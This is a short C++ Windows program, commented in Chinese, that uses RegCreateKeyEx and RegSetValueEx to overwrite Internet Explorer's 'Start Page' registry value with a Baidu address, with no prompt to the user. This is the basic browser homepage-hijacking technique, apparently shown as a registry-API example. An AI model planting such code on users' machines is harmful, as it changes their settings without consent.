// StartPage.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>
//用于修改字符串类型键值
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	//要修改成的网址
	char StartPage[255]="http://www.baidu.cn/";
	//调用修改字符串类型键值的函数
 	CreateStringReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page",StartPage);
	return 0;
}



